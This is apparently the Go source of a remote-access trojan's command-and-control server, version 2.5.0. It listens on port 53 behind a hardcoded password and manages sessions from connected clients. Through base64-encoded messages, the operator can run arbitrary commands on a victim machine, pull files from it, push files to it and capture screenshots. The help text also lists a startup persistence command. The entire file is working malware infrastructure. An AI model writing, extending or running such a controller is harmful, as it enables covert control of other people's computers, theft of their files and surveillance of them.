package main

import (
    "bufio"
    "encoding/base64"
    "flag"
    "fmt"
    "io"
    "io/ioutil"
    "log"
    "net"
    "os"
    "os/exec"
    "path/filepath"
    "strconv"
    "strings"
    "sync"
    "time"
)

const (
    WHITE   = "\x1b[37;1m"
    RED     = "\x1b[31;1m"
    GREEN   = "\x1b[32;1m"
    YELLOW  = "\x1b[33;1m"
    BLUE    = "\x1b[34;1m"
    MAGENTA = "\x1b[35;1m"
    CYAN    = "\x1b[36;1m"
    VERSION = "2.5.0"
)

var (
    inputIP         = flag.String("IP", "0.0.0.0", "Listen IP")
    inputPort       = flag.String("PORT", "53", "Listen Port")
    connPwd         = flag.String("PWD", "zwa666", "Connection Password")
    counter         int                                       //用于会话计数，给map的key使用
    connlist        map[int]net.Conn = make(map[int]net.Conn) //存储所有连接的会话
    connlistIPAddr  map[int]string   = make(map[int]string)   //存储所有IP地址，提供输入标识符显示
    lock                             = &sync.Mutex{}
    downloadOutName string
)

func getDateTime() string {
    currentTime := time.Now()
    // https://golang.org/pkg/time/#example_Time_Format
    return currentTime.Format("2006-01-02-15-04-05")
}

// ReadLine 函数等待命令行输入,返回字符串
func ReadLine() string {
    buf := bufio.NewReader(os.Stdin)
    lin, _, err := buf.ReadLine()
    if err != nil {
        fmt.Println(RED, "[!] Error to Read Line!")
    }
    return string(lin)
}

// Socket客户端连接处理程序,专用于接收消息处理
func connection(conn net.Conn) {
    defer conn.Close()
    var myid int
    myip := conn.RemoteAddr().String()

    lock.Lock()
    counter++
    myid = counter
    connlist[counter] = conn
    connlistIPAddr[counter] = myip
    lock.Unlock()

    fmt.Printf("--- client: %s connection ---\n", myip)
    for {
        message, err := bufio.NewReader(conn).ReadString('\n')
        //如果客户端断开
        if err == io.EOF {
            conn.Close()
            delete(connlist, myid)
            delete(connlistIPAddr, myid)
            break
        }
        decoded, _ := base64.StdEncoding.DecodeString(message)
        decMessage := string(decoded)
        switch decMessage {

        case "download":
            //fmt.Println("---收到download指令，等待下一次数据上传---")
            // 等待用户上传数据
            encData, _ := bufio.NewReader(conn).ReadString('\n')
            fmt.Println(YELLOW, "-> Downloading...")
            decData, _ := base64.URLEncoding.DecodeString(encData)
            downFilePath, _ := filepath.Abs(string(downloadOutName) + getDateTime())
            ioutil.WriteFile(downFilePath, []byte(decData), 777)
            fmt.Println(GREEN, "-> Download Done...")
        case "screenshot":
            encData, _ := bufio.NewReader(conn).ReadString('\n')
            fmt.Println(YELLOW, "-> Getting ScreenShot...")
            decData, _ := base64.URLEncoding.DecodeString(encData)
            //filename := myip + getDateTime()+".png"
            absFilePath, _ := filepath.Abs(strings.Replace(myip, ":", "_", -1) + getDateTime() + ".png")
            ioutil.WriteFile(absFilePath, []byte(decData), 777)
            fmt.Printf(GREEN+"-> ScreenShot Done, filename: %s\n", absFilePath)

        default:
            fmt.Println("\n" + decMessage)
        }
    }
    fmt.Printf("--- %s close---\n", myip)
}

// 等待Socket 客户端连接
func handleConnWait() {
    l, err := net.Listen("tcp", *inputIP+":"+*inputPort)
    if err != nil {
        log.Fatal(err)
    }
    defer l.Close()
    for {
        conn, err := l.Accept()
        if err != nil {
            log.Fatal(err)
        }
        message, err := bufio.NewReader(conn).ReadString('\n')
        decoded, _ := base64.StdEncoding.DecodeString(message)
        if string(decoded) == *connPwd {
            go connection(conn)
        } else {
            backMsg := base64.URLEncoding.EncodeToString([]byte("back"))
            conn.Write([]byte(backMsg + "\n"))
            conn.Close()
        }
    }
}

func main() {
    flag.Parse()
    go handleConnWait()
    connid := 0
    for {
        fmt.Print(RED, "SESSION ", connlistIPAddr[connid], WHITE, "> ")
        command := ReadLine()
        _conn, ok := connlist[connid]
        switch command {
        case "":
            // 如果输入为空，则什么都不做
        case "help":
            fmt.Println("")
            fmt.Println(CYAN, "COMMANDS              DESCRIPTION")
            fmt.Println(CYAN, "-------------------------------------------------------")
            fmt.Println(CYAN, "session             选择在线的客户端")
            fmt.Println(CYAN, "download            下载远程文件")
            fmt.Println(CYAN, "upload              上传本地文件")
            fmt.Println(CYAN, "screenshot          远程桌面截图")
            fmt.Println(CYAN, "charset gbk         设置客户端命令行输出编码,gbk是简体中文")
            fmt.Println(CYAN, "clear               清楚屏幕")
            fmt.Println(CYAN, "exit                客户端下线")
            fmt.Println(CYAN, "quit                退出服务器端")
            fmt.Println(CYAN, "startup             加入启动项目文件夹")
            fmt.Println(CYAN, "-------------------------------------------------------")
            fmt.Println("")
        case "session":
            fmt.Println(connlist)
            fmt.Print("选择客户端ID: ")
            inputid := ReadLine()
            if inputid != "" {
                var e error
                connid, e = strconv.Atoi(inputid)
                if e != nil {
                    fmt.Println("请输入数字")
                } else if _, ok := connlist[connid]; ok {
                    //如果输入并且存在客户端id
                    _cmd := base64.URLEncoding.EncodeToString([]byte("getos"))
                    connlist[connid].Write([]byte(_cmd + "\n"))
                }
            }
        case "clear":
            ClearScreen()
        case "exit":
            if ok {
                encDownload := base64.URLEncoding.EncodeToString([]byte("exit"))
                _conn.Write([]byte(encDownload + "\n"))
            }
        case "quit":
            os.Exit(0)
        case "download":
            if ok {
                // 第一步,发送下载指令
                encDownload := base64.URLEncoding.EncodeToString([]byte("download"))
                _conn.Write([]byte(encDownload + "\n"))
                // 第二步，输入下载路径和要保存的文件名,发送给客户端
                fmt.Print("File Path to Download: ")
                nameDownload := ReadLine()
                fmt.Print("Output name: ")
                downloadOutName = ReadLine()
                // 下发需要download的文件名路径, conn连接的协程里面接收
                encName := base64.URLEncoding.EncodeToString([]byte(nameDownload))
                _conn.Write([]byte(encName + "\n"))
                fmt.Print(encName)
            }

        case "screenshot":
            if ok {
                encScreenShot := base64.URLEncoding.EncodeToString([]byte("screenshot"))
                _conn.Write([]byte(encScreenShot + "\n"))
            }

        case "upload":
            if ok {
                encUpload := base64.URLEncoding.EncodeToString([]byte("upload"))
                _conn.Write([]byte(encUpload + "\n"))

                fmt.Print("File Path to Upload: ")
                pathUpload := ReadLine()

                fmt.Print("Output name: ")
                outputName := ReadLine()
                encOutput := base64.URLEncoding.EncodeToString([]byte(outputName))
                _conn.Write([]byte(encOutput + getDateTime() + "\n"))

                fmt.Println(YELLOW, "-> Uploading...")
                //上传文件
                file, err := ioutil.ReadFile(pathUpload)
                if err != nil {
                    fmt.Println(RED, "[!] File not found!")
                    break
                }
                encData := base64.URLEncoding.EncodeToString(file)
                _conn.Write([]byte(string(encData) + "\n"))
                fmt.Println(GREEN, "-> Upload Done...")
            }
        default:
            if ok {
                _cmd := base64.URLEncoding.EncodeToString([]byte(command))
                _conn.Write([]byte(_cmd + "\n"))
            }
        }
    }
}

// ClearScreen 清除屏幕
func ClearScreen() {
    cmd := exec.Command("clear")
    cmd.Stdout = os.Stdout
    cmd.Run()
}